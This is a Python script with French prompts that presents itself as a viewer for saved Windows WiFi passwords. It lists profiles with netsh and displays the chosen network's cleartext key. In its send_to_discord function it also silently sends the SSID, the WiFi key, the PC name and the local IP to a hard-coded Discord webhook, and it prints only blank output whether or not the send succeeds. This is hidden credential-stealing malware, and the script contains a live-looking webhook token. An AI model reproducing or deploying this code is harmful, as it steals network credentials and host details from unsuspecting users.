import subprocess
import os
import requests
import socket
import platform

def clear_screen():
    """Efface l'écran en fonction du système d'exploitation"""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_saved_networks():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, check=True)
        profiles = result.stdout.split('\n')[4:]  
        networks = []
        for line in profiles:
            if ":" in line:
                network_name = line.split(':')[1].strip()
                networks.append(network_name)
        return networks
    except subprocess.CalledProcessError:
        print("\033[91m [-] \033[0mErreur lors de la récupération des réseaux WiFi. ")
        return []

def show_network_info(network_name):
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name="{network_name}"', 'key=clear'], capture_output=True, text=True, check=True)
        output_lines = result.stdout.split('\n')
        ssid = ""
        key_content = ""
        for line in output_lines:
            if "Nom du SSIDÿ           :" in line:
                ssid = line.split(":")[1].strip()
            elif "Contenu de la cl‚            :" in line:
                key_content = line.split(":")[1].strip()
        if ssid and key_content:
            print("\033[92m [+]\033[0m Nom du SSID:", ssid)
            print("\033[92m [+]\033[0m Contenu de la clé:", key_content + " ")
            send_to_discord(ssid, key_content)
        else:
            print("\033[91m [-] \033[0m Informations manquantes pour le réseau '{}'. ".format(network_name))
    except subprocess.CalledProcessError:
        print(f"\033[91m [-] \033[0m Impossible de trouver des informations pour le réseau '{network_name}'. ")

def send_to_discord(ssid, key_content):
    webhook_url = 'https://discord.com/api/webhooks/1248323325533356106/-ThnPanbKvSy7dVFm5B9CmJJMYA1U_kLqEOAS04FELBAv5Mzf81rHV9qG7iIuYyHF5yb'
    
    # Get the local IP address
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    pc_name = platform.node()
    
    
    data = {
        "content": f"**PC Name:** `{pc_name}`\n**IP Address:** `{local_ip}`\n**SSID:** `{ssid}`\n**Key Content:** `{key_content}`"
    }
    
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print(" ")
        else:
            print(" ")
    except requests.exceptions.RequestException as e:
        print(" ")

if __name__ == "__main__":
    clear_screen()
    logo = """
\033[34m
                                            ╦ ╦╦╔═╗╦╔═╗╦ ╦╦╔═╗╦ ╦╔═╗╦═╗  ┓ ┓
                                            ║║║║╠╣ ║╠═╝╠═╣║╚═╗╠═╣║╣ ╠╦╝  ┃ ┃
                                            ╚╩╝╩╚  ╩╩  ╩ ╩╩╚═╝╩ ╩╚═╝╩╚═  ┻•┻
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
               
\033[34m                                             
"""
    print(logo)
    saved_networks = get_saved_networks()
    if not saved_networks:
        clear_screen()
        print(logo)
        print("\033[91m [-]\033[0m\033[93m Aucun réseau WiFi enregistré trouvé. ")
    else:
        print("\033[92m Réseaux WiFi enregistrés :\033[0m")
        clear_screen()
        print(logo)
        for index, network in enumerate(saved_networks, start=1):
            print(f"\033[94m {index}. {network}\033[0m")

        choice = input("\033[95m Entrez le numéro du réseau que vous souhaitez consulter : \033[0m")
        try:
            choice_index = int(choice)
            if choice_index < 1 or choice_index > len(saved_networks):
                raise ValueError
            selected_network = saved_networks[choice_index - 1]
            print("\033[92m Vous avez choisi le réseau :\033[0m", selected_network)
            clear_screen()
            print(logo)
            show_network_info(selected_network)
        except (ValueError, IndexError):
            print("\033[91m [-]\033[0m Choix invalide.")
            clear_screen()
            print(logo)
